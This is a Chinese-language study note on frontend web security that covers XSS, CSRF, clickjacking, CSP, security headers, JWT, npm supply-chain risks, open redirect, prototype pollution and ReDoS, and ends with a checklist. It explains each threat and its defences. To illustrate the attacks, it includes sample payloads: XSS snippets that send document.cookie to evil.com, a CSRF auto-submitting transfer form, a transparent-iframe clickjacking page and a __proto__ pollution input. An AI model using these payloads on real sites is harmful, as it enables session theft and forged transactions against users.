# 前端安全笔记

> 📌 本文件记录前端安全核心知识：常见攻击方式、防御手段、安全策略与最佳实践。

---

## 1. XSS（跨站脚本攻击）

### 原理

攻击者向页面注入恶意脚本，在用户浏览器中执行，窃取 Cookie、Session、用户数据，或执行伪造操作。

### 三种类型

```
1. 反射型 XSS
   用户请求 URL → 服务端将参数直接拼入 HTML 返回 → 浏览器执行
   GET /search?q=<script>alert(document.cookie)</script>

2. 存储型 XSS（危害最大）
   恶意脚本存入数据库 → 其他用户访问时从数据库取出渲染 → 执行
   评论、留言板、用户昵称等 UGC 场景

3. DOM 型 XSS（纯前端）
   前端 JS 从不安全的 DOM 位置读取数据并执行
   常见来源：location.hash / location.search / document.referrer / innerHTML
```

### 攻击示例

```html
<!-- 1. 直接注入 script -->
<div th:utext="${param.q}"></div>
<!-- 输入: <script>fetch('https://evil.com?c='+document.cookie)</script> -->

<!-- 2. 事件属性 -->
<img src="x" onerror="fetch('https://evil.com?c='+document.cookie)">
<img src=x onerror=alert(1)>

<!-- 3. javascript: 伪协议 -->
<a href="javascript:alert(document.cookie)">点击领取奖品</a>

<!-- 4. SVG 注入 -->
<svg onload="alert(1)">
```

### DOM 型 XSS 危险 API

```js
// ❌ 危险：直接执行
eval(userInput)
setTimeout(userInput)        // 传字符串时
new Function(userInput)()

// ❌ 危险：写入 DOM
element.innerHTML = userInput
element.outerHTML = userInput
element.insertAdjacentHTML('beforeend', userInput)
document.write(userInput)
document.writeln(userInput)

// ❌ 危险：动态创建 script
const script = document.createElement('script')
script.text = userInput
document.body.appendChild(script)

// ❌ 危险：jQuery
$(selector).html(userInput)
$(selector).append(userInput)

// ✅ 安全替代
element.textContent = userInput           // 纯文本
element.innerText = userInput
$(selector).text(userInput)               // jQuery 纯文本
```

### 防御手段

```js
// 1. 输入转义（核心）
function escapeHTML(str) {
  const map = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }
  return str.replace(/[&<>"']/g, c => map[c])
}

// 2. 框架自带转义（Vue/React 默认转义文本插值）
// Vue: {{ userInput }}  → 自动转义 ✅
// Vue: v-html="userInput" → 不转义 ⚠️ 确保内容可信
// React: {userInput} → 自动转义 ✅
// React: dangerouslySetInnerHTML={{ __html: userInput }} → 不转义 ⚠️

// 3. 富文本场景用白名单过滤（不要用正则！）
// DOMPurify（推荐）
import DOMPurify from 'dompurify'
const clean = DOMPurify.sanitize(dirtyHTML, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],
  ALLOWED_ATTR: ['href'],
})

// 4. HttpOnly Cookie（防止 JS 读取）
// Set-Cookie: sessionId=xxx; HttpOnly; Secure; SameSite=Strict

// 5. CSP（Content Security Policy）— 见第 5 节
```

---

## 2. CSRF（跨站请求伪造）

### 原理

利用浏览器自动携带 Cookie 的机制，诱导已登录用户在不知情的情况下向目标站点发送恶意请求。

```
场景：用户已登录 bank.com
1. 用户访问恶意页面 evil.com
2. 页面中隐藏: <img src="https://bank.com/transfer?to=hacker&amount=10000">
3. 浏览器自动携带 bank.com 的 Cookie 发出请求
4. 服务端认为是合法用户操作，转账成功
```

### 攻击向量

```html
<!-- GET 请求 -->
<img src="https://bank.com/transfer?to=hacker&amount=10000">
<link href="https://bank.com/transfer?to=hacker&amount=10000">

<!-- POST 请求（自动提交表单） -->
<form action="https://bank.com/transfer" method="POST" id="csrf">
  <input name="to" value="hacker">
  <input name="amount" value="10000">
</form>
<script>document.getElementById('csrf').submit()</script>
```

### 防御手段

```js
// 1. CSRF Token（最常用、最可靠）
// 服务端生成随机 token，放入 session 和页面
// 每次请求携带 token，服务端校验

// 服务端渲染
<meta name="csrf-token" content="{{ csrfToken }}">

// 前端请求时带上
const token = document.querySelector('meta[name="csrf-token"]').content
fetch('/api/transfer', {
  method: 'POST',
  headers: { 'X-CSRF-Token': token },
  body: JSON.stringify(data),
})

// 2. SameSite Cookie（推荐配合使用）
// Set-Cookie: sessionId=xxx; SameSite=Strict
// Strict: 完全禁止第三方携带（最安全，但从其他站点跳转过来也没有）
// Lax:  允许部分顶级导航 GET 请求携带（默认值，平衡安全与体验）
// None: 允许跨站携带（必须同时设置 Secure）

// 3. 验证 Referer / Origin
// 服务端检查请求来源是否合法
// Referer: https://bank.com/page
// Origin: https://bank.com
// ⚠️ 可能被隐私设置/代理/跳转影响，作为辅助手段

// 4. 双重 Cookie 验证
// 把 token 放 cookie 和请求参数中各一份，服务端对比
// 攻击者无法读取 cookie（同源策略），所以无法构造合法请求
```

### CSRF vs XSS

| | XSS | CSRF |
|---|---|---|
| 攻击方式 | 注入脚本到页面 | 伪造用户请求 |
| 目标 | 用户数据/操作 | 以用户身份执行操作 |
| 是否需要登录 | 不一定 | 需要用户已登录 |
| 防御核心 | 转义输出 | Token / SameSite |

---

## 3. 点击劫持（Clickjacking）

### 原理

用透明 iframe 将目标页面覆盖在诱导页面之上，用户以为点击的是可见按钮，实际点击了 iframe 中的操作按钮。

```html
<!-- 攻击页面 -->
<style>
  iframe { opacity: 0; position: absolute; top: 0; left: 0; width: 100%; height: 100%; }
  .bait { position: absolute; top: 300px; left: 400px; z-index: -1; }
</style>
<button class="bait">🎁 点击领奖</button>
<iframe src="https://bank.com/settings/delete-account"></iframe>
```

### 防御

```html
<!-- 1. X-Frame-Options（HTTP 响应头） -->
X-Frame-Options: DENY          <!-- 禁止任何页面 iframe 嵌套 -->
X-Frame-Options: SAMEORIGIN    <!-- 只允许同源嵌套 -->

<!-- 2. CSP frame-ancestors（更灵活，推荐） -->
Content-Security-Policy: frame-ancestors 'none'
Content-Security-Policy: frame-ancestors 'self' https://trusted.com

<!-- 3. 前端 JS 防御（兜底，可被绕过） -->
<script>
  if (window.top !== window.self) {
    window.top.location = window.self.location
  }
</script>
```

---

## 4. 敏感数据保护

### Cookie 安全属性

```
Set-Cookie: sessionId=abc123;
  HttpOnly;          ← JS 无法读取（防 XSS 窃取）
  Secure;            ← 仅 HTTPS 传输
  SameSite=Strict;   ← 防 CSRF
  Max-Age=3600;      ← 设置过期时间
  Path=/;            ← 限制作用路径
  Domain=example.com ← 限制作用域
```

### 本地存储安全

```js
// ❌ 不要存敏感信息
localStorage.setItem('token', jwt)          // XSS 可直接读取
localStorage.setItem('password', '123456')  // 明文存储
sessionStorage.setItem('idCard', '...')     // 同上

// ✅ 推荐做法
// 1. Token 放 HttpOnly Cookie（后端设置）
// 2. 必须用 localStorage 时，加密存储
import CryptoJS from 'crypto-js'
const encrypted = CryptoJS.AES.encrypt(token, secretKey).toString()
localStorage.setItem('token', encrypted)

// 3. 敏感数据用内存变量，关闭页面即清除
let sensitiveData = null  // 不持久化
```

### 前端密钥管理

```
⚠️ 前端代码完全透明！以下都不安全：
- 硬编码的 API Key / Secret
- 加密密钥写在 JS 中
- 前端生成的"加密"（用户可逆向）

✅ 正确做法：
- 密钥永远放后端
- 前端通过后端 API 获取已签名的数据
- 必须在前端的 key（如地图 API Key），通过域名白名单限制
```

---

## 5. CSP（Content Security Policy）

### 原理

通过 HTTP 头或 meta 标签声明可信资源来源，浏览器只加载白名单内的资源，从根本上阻止 XSS。

### 配置方式

```html
<!-- HTTP 响应头（推荐） -->
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:;

<!-- HTML meta 标签（降级方案） -->
<meta http-equiv="Content-Security-Policy"
  content="default-src 'self'; script-src 'self' https://cdn.example.com">
```

### 常用指令

```
default-src    默认回退策略
script-src     JS 来源（inline、eval、外部脚本）
style-src      CSS 来源
img-src        图片来源
connect-src    XHR/fetch/WebSocket 目标
font-src       字体来源
frame-src      iframe 来源
object-src     <object>/<embed>/<applet> 来源
media-src      音视频来源
form-action    表单提交目标
frame-ancestors 谁可以嵌套本页面（替代 X-Frame-Options）
base-uri       <base> 标签限制
upgrade-insecure-requests  自动将 HTTP 升级为 HTTPS
```

### 来源值

```
'self'           同源（协议+域名+端口）
'unsafe-inline'  允许内联（⚠️ 削弱安全性）
'unsafe-eval'    允许 eval（⚠️ 削弱安全性）
'none'           禁止所有
'https:'          所有 HTTPS 来源
*.example.com    子域名
'nonce-abc123'   指定 nonce 值的内联脚本
'sha256-xxx'     指定 hash 的脚本
```

### nonce 模式（推荐）

```html
<!-- 每次请求生成随机 nonce -->
<script nonce="abc123">
  // 合法的内联脚本
</script>

<!-- CSP 头 -->
Content-Security-Policy: script-src 'nonce-abc123'
```

### 报告模式（先观察再 enforcing）

```
<!-- 只报告违规，不阻断 -->
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
Content-Security-Policy-Report-Only: default-src 'self'; report-to csp-endpoint

<!-- 配合后端收集违规报告，逐步收紧策略 -->
```

---

## 6. 安全响应头

```
# 完整的安全响应头配置（Nginx 示例）

# CSP
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob: https:;

# 禁止 iframe 嵌套
X-Frame-Options: DENY

# 禁止 MIME 嗅探
X-Content-Type-Options: nosniff

# 启用 XSS 过滤（旧浏览器）
X-XSS-Protection: 1; mode=block

# HTTPS 强制
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

# 限制 Referer 泄露
Referrer-Policy: strict-origin-when-cross-origin

# 限制浏览器功能
Permissions-Policy: camera=(), microphone=(), geolocation=()
```

---

## 7. JWT 安全

### JWT 结构

```
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOjF9.abc123
|____header____|.|___payload___|.|__signature__|
```

### 常见安全问题

```js
// 1. 算法混淆攻击（Algorithm Confusion）
// 攻击者将 header.alg 改为 "none" 或 RS256→HS256
// ❌ 必须服务端校验算法
const decoded = jwt.verify(token, secret, { algorithms: ['HS256'] })

// 2. 前端存储风险
// ❌ localStorage（XSS 可窃取）
localStorage.setItem('token', jwt)

// ✅ HttpOnly Cookie（配合 CSRF 防御）
// 或内存变量 + refresh token 方案

// 3. 过期时间
// access token: 短（15min ~ 2h）
// refresh token: 长（7d ~ 30d），存 HttpOnly Cookie
// ⚠️ JWT 无法主动失效（除非维护黑名单）

// 4. 敏感信息
// payload 只是 Base64 编码，不是加密！任何人都能解码
// ❌ 不要在 payload 中放密码、手机号等敏感信息
```

### Token 刷新方案

```js
// 双 Token 方案
// access_token: 短期，放内存
// refresh_token: 长期，放 HttpOnly Cookie

async function request(url, options) {
  let res = await fetch(url, {
    ...options,
    headers: { Authorization: `Bearer ${accessToken}` },
  })

  if (res.status === 401) {
    // access_token 过期，尝试刷新
    const refreshRes = await fetch('/api/refresh', { credentials: 'include' })
    if (refreshRes.ok) {
      const { accessToken: newToken } = await refreshRes.json()
      accessToken = newToken
      // 重试原请求
      res = await fetch(url, {
        ...options,
        headers: { Authorization: `Bearer ${newToken}` },
      })
    } else {
      // refresh_token 也过期，跳转登录
      redirectToLogin()
    }
  }
  return res
}
```

---

## 8. 依赖安全

### 风险

```
npm 包供应链攻击：
- 恶意包名仿冒（typosquatting）: lodash → 1odash
- 包被劫持：维护者账号被盗，发布恶意版本
- 依赖链过长：一个项目可能间接依赖数千个包
- postinstall 脚本可执行任意命令
```

### 防御

```bash
# 1. 审计依赖
npm audit
npm audit fix
npx audit-ci  # CI 中自动检查

# 2. 锁定版本
# package-lock.json / yarn.lock / pnpm-lock.yaml
# 防止自动升级到恶意版本

# 3. 定期更新依赖
npx npm-check-updates    # 检查可更新包
npx updates -u -g        # 全局更新

# 4. 使用 lockfile 完整性校验
npm ci  # CI 中使用，严格按 lockfile 安装

# 5. 检查包的健康度
# - 周下载量、GitHub stars
# - 最近更新时间
# - 维护者数量
# - 是否有已知漏洞

# 6. Socket.dev / Snyk — 实时依赖监控
# 7. .npmrc 配置
always-auth=true
registry=https://registry.npmmirror.com  # 国内镜像
```

---

## 9. URL 与路由安全

```js
// 1. 开放重定向（Open Redirect）
// ❌ 危险：直接使用 URL 参数跳转
const redirect = new URLSearchParams(location.search).get('redirect')
location.href = redirect  // 攻击者构造 redirect=https://evil.com

// ✅ 白名单校验
const allowedPaths = ['/home', '/profile', '/settings']
if (allowedPaths.includes(redirect)) {
  location.href = redirect
} else {
  location.href = '/home'  // 默认回首页
}

// 2. 路由参数校验
// 前端路由参数同样需要校验和转义
const id = params.id
if (!/^\d+$/.test(id)) {
  // 非法参数，展示错误页面
}

// 3. URL 编码
// 构造 URL 时编码参数
const url = `/search?q=${encodeURIComponent(userInput)}`

// 4. 协议校验（防 javascript: 攻击）
function isSafeUrl(url) {
  try {
    const parsed = new URL(url)
    return ['http:', 'https:'].includes(parsed.protocol)
  } catch {
    return false
  }
}
```

---

## 10. 其他安全威胁

### 原型链污染（Prototype Pollution）

```js
// 攻击者通过合并操作修改 Object.prototype
function merge(target, source) {
  for (const key in source) {
    if (isObject(target[key]) && isObject(source[key])) {
      merge(target[key], source[key])
    } else {
      target[key] = source[key]  // ❌ 未校验 key
    }
  }
}

// 攻击
merge({}, JSON.parse('{"__proto__": {"isAdmin": true}}'))
// 所有对象的 isAdmin 都变成 true

// 防御
// 1. 使用 Object.create(null) 作为空对象
// 2. 校验 key，过滤 __proto__ / constructor / prototype
// 3. 使用 lodash.merge 的安全版本或 immer
```

### 正则 DoS（ReDoS）

```js
// 灾难性回溯正则
const emailRegex = /^([a-zA-Z0-9]+)+@([a-zA-Z0-9]+)+\.[a-zA-Z]+$/.test(input)

// 攻击输入: "a]" + "a".repeat(50000) + "@"
// 指数级回溯，CPU 卡死

// 防御：避免嵌套量词，使用安全正则或限制输入长度
```

### 第三方资源风险

```html
<!-- CDN 被劫持 → 注入恶意脚本 -->
<script src="https://cdn.example.com/lib.js"></script>

<!-- SRI 完整性校验 -->
<script src="https://cdn.example.com/lib.js"
  integrity="sha384-xxxxx"
  crossorigin="anonymous"></script>

<!-- 浏览器校验 hash 不匹配则拒绝执行 -->
```

### 调试信息泄露

```
生产环境必须关闭：
- console.log / console.debug
- source map（或只对内网提供）
- 错误堆栈详情（用统一错误页替代）
- 多余的 HTTP 头（X-Powered-By, Server 版本等）
```

---

## 11. 安全检查清单

### 开发阶段

- [ ] 所有用户输入都经过转义后再渲染
- [ ] 富文本使用 DOMPurify 白名单过滤
- [ ] 不使用 innerHTML / v-html / dangerouslySetInnerHTML 渲染不可信内容
- [ ] 不使用 eval / new Function / setTimeout(string)
- [ ] URL 参数经过校验和编码
- [ ] 敏感数据不存入 localStorage
- [ ] Cookie 设置 HttpOnly + Secure + SameSite

### 部署阶段

- [ ] 配置 CSP 响应头
- [ ] 配置 X-Frame-Options / X-Content-Type-Options / HSTS
- [ ] 全站 HTTPS
- [ ] 关闭 source map（或限制访问）
- [ ] 移除 console.log 和调试代码
- [ ] npm audit 无高危漏洞
- [ ] 第三方脚本使用 SRI 校验

### 接口安全

- [ ] 关键操作使用 POST（非 GET）
- [ ] 配置 CSRF Token
- [ ] 接口鉴权 + 权限校验
- [ ] 敏感接口限流 + 验证码
- [ ] 响应中不返回多余字段

---

## 参考资源

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [MDN CSP](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP)
- [MDN XSS](https://developer.mozilla.org/zh-CN/docs/Glossary/Cross-site_scripting)
- [DOMPurify](https://github.com/cure53/DOMPurify)
- [CSP Evaluator](https://csp-evaluator.withgoogle.com/) — Google CSP 策略检测工具
- [SRI Hash Generator](https://www.srihash.org/) — SRI 完整性 hash 生成
